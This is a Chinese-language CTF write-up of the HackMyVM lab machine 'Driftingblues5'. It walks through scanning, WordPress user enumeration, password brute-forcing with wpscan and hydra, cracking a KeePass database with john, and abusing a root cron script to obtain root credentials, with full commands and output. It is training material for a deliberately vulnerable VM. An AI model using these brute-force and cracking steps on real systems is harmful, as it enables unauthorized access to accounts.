---
title: Driftingblues5
author: hgbe02
date: 2024-04-11
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Driftingblues5.html"
---

# driftingblues5

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555940.png" alt="image-20240411143032778" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
nmap -sCV 172.20.10.4
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.6.2
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: diary &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
sudo dirsearch -u http://172.20.10.4 -e* -i 200,300-399 2>/dev/null 
```

```text
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 14594

Output File: /home/kali/reports/http_172.20.10.4/_24-04-11_02-32-03.txt

Target: http://172.20.10.4/
[02:32:03] Starting: 
[02:32:22] 301 -    0B  - /index.php  ->  http://172.20.10.4/
[02:32:23] 200 -    7KB - /license.txt
[02:32:32] 200 -    3KB - /readme.html
[02:32:45] 301 -  313B  - /wp-admin  ->  http://172.20.10.4/wp-admin/
[02:32:45] 200 -  512B  - /wp-admin/install.php
[02:32:45] 302 -    0B  - /wp-admin/  ->  http://172.20.10.4/wp-login.php?redirect_to=http%3A%2F%2F172.20.10.4%2Fwp-admin%2F&reauth=1
[02:32:45] 200 -    0B  - /wp-config.php
[02:32:45] 301 -  315B  - /wp-content  ->  http://172.20.10.4/wp-content/
[02:32:45] 200 -    0B  - /wp-content/
[02:32:45] 200 -   84B  - /wp-content/plugins/akismet/akismet.php
[02:32:45] 200 -  472B  - /wp-content/uploads/
[02:32:45] 301 -  316B  - /wp-includes  ->  http://172.20.10.4/wp-includes/
[02:32:45] 200 -    0B  - /wp-cron.php
[02:32:45] 200 -    0B  - /wp-includes/rss-functions.php
[02:32:45] 200 -    2KB - /wp-login.php
[02:32:45] 200 -    4KB - /wp-includes/
[02:32:45] 302 -    0B  - /wp-signup.php  ->  http://172.20.10.4/wp-login.php?action=register

Task Completed
```

### 漏洞扫描

```bash
nikto -h http://172.20.10.4
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.4
+ Target Hostname:    172.20.10.4
+ Target Port:        80
+ Start Time:         2024-04-11 02:32:30 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal Link header found with value: <http://172.20.10.4/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index.php?: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wp-login.php: Wordpress login found.
+ 8102 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2024-04-11 02:32:53 (GMT-4) (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### wpscan

```bash
wpscan --url http://172.20.10.4/ -e u --api-token=xxxx
```

```css
[i] User(s) Identified:

[+] abuzerkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.20.10.4/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gill
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gadd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

先不用漏洞，因为机器比较老了，不知道是不是作者想要我们使用漏洞。

## 漏洞利用

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555942.png" alt="image-20240411143556863" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555943.png" alt="image-20240411143723207" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555944.png" alt="image-20240411143735848" style="zoom:50%;" />

这个SPIP版本就是有漏洞的。。。

### 查看敏感目录

```apl
http://172.20.10.4/readme.html
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555945.png" alt="image-20240411143853333" style="zoom:50%;" />

```bash
http://172.20.10.4/wp-admin
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555946.png" alt="image-20240411143925060" style="zoom:50%;" />

### 爆破

尝试使用rockyou和网页上爬取生成的字典对几个用户进行爆破：

```bash
echo 'abuzerkomurcu\ngill\ncollins\nsatanic\ngadd' > user.txt
```

```bash
cewl http://172.20.10.4/ -d 2 -m 6 -w pass.txt --with-numbers
# -d 2 递归两层
# -m 最小密码长度
# --with-number 密码可以带数字 
```

`cewl`比较适合做国外的靶场，结果比较好，然后爆破一下：

```bash
┌──(kali💀kali)-[~/temp/driftingblues5]
└─$ wpscan --url http://172.20.10.4 -U user.txt -P pass.txt

[+] Performing password attack on Wp Login against 5 user/s
[SUCCESS] - gill / interchangeable                                                                                                                      
Trying gadd / Author Time: 00:00:45 <===============================================================               > (4522 / 5460) 82.82%  ETA: ??:??:??
```

也尝试了ssh爆破，但是没有，估计也出不了了：

```bash
┌──(kali💀kali)-[~/temp/driftingblues5]
└─$ hydra -L user.txt -P pass.txt ssh://172.20.10.4     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-11 02:47:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4690 login tries (l:5/p:938), ~294 tries per task
[DATA] attacking ssh://172.20.10.4:22/
[STATUS] 124.00 tries/min, 124 tries in 00:01h, 4567 to do in 00:37h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 4375 to do in 00:42h, 15 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

登录上去看看：

```apl
gill
interchangeable
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555947.png" alt="image-20240411145313615" style="zoom:50%;" />

我们看来他几个blog但是没啥发现。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555948.png" alt="image-20240411145722307" style="zoom:50%;" />

发现一张奇怪的图片，图标是本题数据库的字样，尝试下载下来：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555949.png" alt="image-20240411145810033" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555950.png" alt="image-20240411145945914" style="zoom:50%;" />

```bash
┌──(kali💀kali)-[~/temp/driftingblues5]
└─$ exiftool dblogo.png 
ExifTool Version Number         : 12.76
File Name                       : dblogo.png
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2021:02:24 09:46:01-05:00
File Access Date/Time           : 2024:04:11 02:58:59-04:00
File Inode Change Date/Time     : 2024:04:11 02:58:20-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 300
Image Height                    : 300
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39
Creator Tool                    : Adobe Photoshop CC 2018 (Windows)
Create Date                     : 2021:02:24 02:55:28+03:00
Metadata Date                   : 2021:02:24 02:55:28+03:00
Modify Date                     : 2021:02:24 02:55:28+03:00
Instance ID                     : xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
Document ID                     : adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b
Original Document ID            : xmp.did:5890be6c-649b-0248-af9b-19889727200c
Color Mode                      : RGB
ICC Profile Name                : sRGB IEC61966-2.1
Format                          : image/png
History Action                  : created, saved
History Instance ID             : xmp.iid:5890be6c-649b-0248-af9b-19889727200c, xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
History When                    : 2021:02:24 02:55:28+03:00, 2021:02:24 02:55:28+03:00
History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)
History Changed                 : /
Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not
Text Layer Text                 : ssh password is 59583hello of course it is lowercase maybe not :)
Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b
Image Size                      : 300x300
Megapixels                      : 0.090
```

发现他写的`ssh`密码为`59583hello`，尝试进行爆破：

```bash
┌──(kali💀kali)-[~/temp/driftingblues5]
└─$ hydra -L user.txt -p 59583hello  ssh://172.20.10.4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-11 03:01:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://172.20.10.4:22/
[22][ssh] host: 172.20.10.4   login: gill   password: 59583hello
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-11 03:01:48
```

```apl
gill
59583hello
```

ssh登录一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555951.png" alt="image-20240411150327686" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) gill@driftingblues:/home/gill$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
(remote) gill@driftingblues:/home/gill$ sudo -l
-bash: sudo: command not found
(remote) gill@driftingblues:/home/gill$ ls -la
total 24
drwxr-xr-x 4 gill gill 4096 Apr 11 02:01 .
drwxr-xr-x 3 root root 4096 Feb 24  2021 ..
drwx------ 3 gill gill 4096 Apr 11 02:01 .gnupg
-rwx------ 1 gill gill 2030 Feb 24  2021 keyfile.kdbx
drwx------ 2 gill gill 4096 Feb 24  2021 .ssh
-r-x------ 1 gill gill   32 Feb 24  2021 user.txt
(remote) gill@driftingblues:/home/gill$ cat user.txt 
F83FC7429857283616AE62F8B64143E6(remote) gill@driftingblues:/home/gill$ file keyfile.kdbx 
keyfile.kdbx: Keepass password database 2.x KDBX
```

> **Keepass Password Database 2.x KDBX** 是KeePass密码管理器版本2.x所使用的数据库文件格式。KeePass是一个可以在多个操作系统（如Windows、MAC、Linux等）以及移动设备上运行的密码管理器。它使用高度加密的数据库来存储口令，这些口令通过一个主密钥文件锁定。即使老版本的KeePass使用的是KDB文件，它们仍然可以用来打开KDBX文件。简而言之，KDBX文件是KeePass版本2.x的密码数据库文件，用于安全地存储和管理用户的密码信息。
>
> 参考：https://blog.csdn.net/u012206617/article/details/130964836

尝试破解一下：

```bash
┌──(kali💀kali)-[~/temp/driftingblues5]
└─$ keepass2john keyfile.kdbx > hash

┌──(kali💀kali)-[~/temp/driftingblues5]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt        
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
porsiempre       (keyfile)     
1g 0:00:00:53 DONE (2024-04-11 03:18) 0.01869g/s 128.7p/s 128.7c/s 128.7C/s winston1..palomita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

然后安装一个`keepass2`

```bash
sudo apt install keepass2
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555952.png" alt="image-20240411152246237" style="zoom:50%;" />

```apl
zakkwylde
buddyretard
2read4surreal
closet313
fracturedocean
exalted
```

尝试使用这几个密码切换root，但是无果。

### 上传linpeas.sh与pspy64

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555953.png" alt="image-20240411152712458" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555954.png" alt="image-20240411152852997" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404111555955.png" alt="image-20240411153313123" style="zoom:50%;" />

what？这玩个球。

### 信息搜集

我们在找找吧：

```bash
(remote) gill@driftingblues:/tmp$ cd /
(remote) gill@driftingblues:/$ ls -la
total 69
drwxr-xr-x 19 root root  4096 Feb 24  2021 .
drwxr-xr-x 19 root root  4096 Feb 24  2021 ..
lrwxrwxrwx  1 root root     7 Dec 17  2020 bin -> usr/bin
drwxr-xr-x  3 root root  4096 Dec 17  2020 boot
drwxr-xr-x 17 root root  3260 Apr 11 01:28 dev
drwxr-xr-x 73 root root  4096 Apr 11 01:28 etc
drwxr-xr-x  3 root root  4096 Feb 24  2021 home
lrwxrwxrwx  1 root root    31 Dec 17  2020 initrd.img -> boot/initrd.img-4.19.0-13-amd64
lrwxrwxrwx  1 root root    31 Dec 17  2020 initrd.img.old -> boot/initrd.img-4.19.0-13-amd64
drwx---rwx  2 root root  4096 Feb 24  2021 keyfolder
lrwxrwxrwx  1 root root     7 Dec 17  2020 lib -> usr/lib
lrwxrwxrwx  1 root root     9 Dec 17  2020 lib32 -> usr/lib32
lrwxrwxrwx  1 root root     9 Dec 17  2020 lib64 -> usr/lib64
lrwxrwxrwx  1 root root    10 Dec 17  2020 libx32 -> usr/libx32
drwx------  2 root root 16384 Dec 17  2020 lost+found
drwxr-xr-x  3 root root  4096 Dec 17  2020 media
drwxr-xr-x  2 root root  4096 Dec 17  2020 mnt
drwxr-xr-x  2 root root  4096 Dec 17  2020 opt
dr-xr-xr-x 94 root root     0 Apr 11 01:28 proc
drwx------  2 root root  4096 Feb 24  2021 root
drwxr-xr-x 18 root root   540 Apr 11 02:03 run
lrwxrwxrwx  1 root root     8 Dec 17  2020 sbin -> usr/sbin
drwxr-xr-x  2 root root  4096 Dec 17  2020 srv
dr-xr-xr-x 13 root root     0 Apr 11 01:28 sys
drwxrwxrwt  9 root root  1024 Apr 11 02:26 tmp
drwxr-xr-x 13 root root  4096 Dec 17  2020 usr
drwxr-xr-x 13 root root  4096 Dec 17  2020 var
lrwxrwxrwx  1 root root    28 Dec 17  2020 vmlinuz -> boot/vmlinuz-4.19.0-13-amd64
lrwxrwxrwx  1 root root    28 Dec 17  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-13-amd64
(remote) gill@driftingblues:/$ cd /opt;ls -la
total 8
drwxr-xr-x  2 root root 4096 Dec 17  2020 .
drwxr-xr-x 19 root root 4096 Feb 24  2021 ..
(remote) gill@driftingblues:/opt$ cd /keyfolder/
(remote) gill@driftingblues:/keyfolder$ ls -la
total 8
drwx---rwx  2 root root 4096 Feb 24  2021 .
drwxr-xr-x 19 root root 4096 Feb 24  2021 ..
(remote) gill@driftingblues:/keyfolder$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
(remote) gill@driftingblues:/keyfolder$ cd /usr/local
(remote) gill@driftingblues:/usr/local$ ls -la
total 40
drwxr-xr-x 10 root root 4096 Dec 17  2020 .
drwxr-xr-x 13 root root 4096 Dec 17  2020 ..
drwxr-xr-x  2 root root 4096 Dec 17  2020 bin
drwxr-xr-x  2 root root 4096 Dec 17  2020 etc
drwxr-xr-x  2 root root 4096 Dec 17  2020 games
drwxr-xr-x  2 root root 4096 Dec 17  2020 include
drwxr-xr-x  4 root root 4096 Dec 17  2020 lib
lrwxrwxrwx  1 root root    9 Dec 17  2020 man -> share/man
drwxr-xr-x  2 root root 4096 Dec 17  2020 sbin
drwxr-xr-x  4 root root 4096 Dec 17  2020 share
drwxr-xr-x  2 root root 4096 Dec 17  2020 src
(remote) gill@driftingblues:/usr/local$ mail
-bash: mail: command not found
(remote) gill@driftingblues:/usr/local$ cd share
(remote) gill@driftingblues:/usr/local/share$ ls
ca-certificates  man
(remote) gill@driftingblues:/usr/local/share$ cd /
```

不知道要找啥，看一下wp，发现逻辑可能是检测`keyfolder`是否存在密钥，如果存在的话，就把密码丢进去。。

得一个一个试，只有一个密码是我们想要的，尝试全部创建试一下：

```
buddyretard
2read4surreal
closet313
fracturedocean
exalted
```

`zakkwylde`我已经试过了，不行，一起全传上去也不行：

```bash
(remote) gill@driftingblues:/$ cd keyfolder/
(remote) gill@driftingblues:/keyfolder$ touch zakkwylde
(remote) gill@driftingblues:/keyfolder$ cd /tmp
(remote) gill@driftingblues:/tmp$ ./pspy64 
........
2024/04/11 02:45:37 CMD: UID=0    PID=1      | /sbin/init 
2024/04/11 02:46:01 CMD: UID=0    PID=13906  | /usr/sbin/CRON -f 
2024/04/11 02:46:01 CMD: UID=0    PID=13907  | /usr/sbin/CRON -f 
2024/04/11 02:46:01 CMD: UID=0    PID=13908  | /bin/sh -c /root/key.sh 
2024/04/11 02:46:01 CMD: UID=0    PID=13909  | /bin/bash /root/key.sh 
2024/04/11 02:46:03 CMD: UID=0    PID=13910  | 
^CExiting program... (interrupt)
(remote) gill@driftingblues:/tmp$ cd /keyfolder/
(remote) gill@driftingblues:/keyfolder$ ls
zakkwylde
(remote) gill@driftingblues:/keyfolder$ rm zakkwylde 
(remote) gill@driftingblues:/keyfolder$ touch buddyretard
(remote) gill@driftingblues:/keyfolder$ touch 2read4surreal
(remote) gill@driftingblues:/keyfolder$ touch closet313
(remote) gill@driftingblues:/keyfolder$ touch fracturedocean
(remote) gill@driftingblues:/keyfolder$ touch exalted
(remote) gill@driftingblues:/keyfolder$ cd /tmp;./pspy64
........
2024/04/11 02:47:49 CMD: UID=0    PID=1      | /sbin/init 
2024/04/11 02:48:01 CMD: UID=0    PID=13964  | /usr/sbin/CRON -f 
2024/04/11 02:48:01 CMD: UID=0    PID=13965  | /usr/sbin/CRON -f 
2024/04/11 02:48:01 CMD: UID=0    PID=13966  | /bin/sh -c /root/key.sh 
2024/04/11 02:48:01 CMD: UID=0    PID=13967  | /bin/bash /root/key.sh 
^CExiting program... (interrupt)
(remote) gill@driftingblues:/tmp$ cd /keyfolder/
(remote) gill@driftingblues:/keyfolder$ ls
2read4surreal  buddyretard  closet313  exalted  fracturedocean
```

那只能一个一个来了：

```bash
(remote) gill@driftingblues:/keyfolder$ ls
2read4surreal  buddyretard  closet313  exalted  fracturedocean
(remote) gill@driftingblues:/keyfolder$ rm 2read4surreal buddyretard closet313 exalted 
(remote) gill@driftingblues:/keyfolder$ ls
fracturedocean
(remote) gill@driftingblues:/keyfolder$ ls
fracturedocean
(remote) gill@driftingblues:/keyfolder$ rm fracturedocean 
(remote) gill@driftingblues:/keyfolder$ touch buddyretard
(remote) gill@driftingblues:/keyfolder$ ls
buddyretard
(remote) gill@driftingblues:/keyfolder$ ls
buddyretard
(remote) gill@driftingblues:/keyfolder$ rm buddyretard 
(remote) gill@driftingblues:/keyfolder$ touch 2read4surreal
(remote) gill@driftingblues:/keyfolder$ ls
2read4surreal
(remote) gill@driftingblues:/keyfolder$ ls
2read4surreal
(remote) gill@driftingblues:/keyfolder$ rm 2read4surreal 
(remote) gill@driftingblues:/keyfolder$ touch closet313
(remote) gill@driftingblues:/keyfolder$ ls
closet313
(remote) gill@driftingblues:/keyfolder$ ls
closet313
(remote) gill@driftingblues:/keyfolder$ rm closet313 
(remote) gill@driftingblues:/keyfolder$ touch fracturedocean
(remote) gill@driftingblues:/keyfolder$ ls
fracturedocean
(remote) gill@driftingblues:/keyfolder$ ls
fracturedocean  rootcreds.txt
(remote) gill@driftingblues:/keyfolder$ cat rootcreds.txt 
root creds

imjustdrifting31
(remote) gill@driftingblues:/keyfolder$ su root
Password: 
root@driftingblues:/keyfolder# cd /root
root@driftingblues:~# ls -la
total 20
drwx------  2 root root 4096 Feb 24  2021 .
drwxr-xr-x 19 root root 4096 Feb 24  2021 ..
-rw-------  1 root root   61 Feb 24  2021 .bash_history
-rwx------  1 root root  205 Feb 24  2021 key.sh
-r-x------  1 root root   32 Feb 24  2021 root.txt
root@driftingblues:~# cat root.txt 
9EFF53317826250071574B4D4EE56840root@driftingblues:~# cat key.sh 
#!/bin/bash

if [[ $(ls /keyfolder) == "fracturedocean" ]]; then
        echo "root creds" >> /keyfolder/rootcreds.txt
        echo "" >> /keyfolder/rootcreds.txt
        echo "imjustdrifting31" >> /keyfolder/rootcreds.txt
fi
root@driftingblues:~# cat .bash_history 
cd /
ls -la
cd /root/
./logdel2 
rm logdel2 
shutdown -h now
```

拿到flag。。。。。

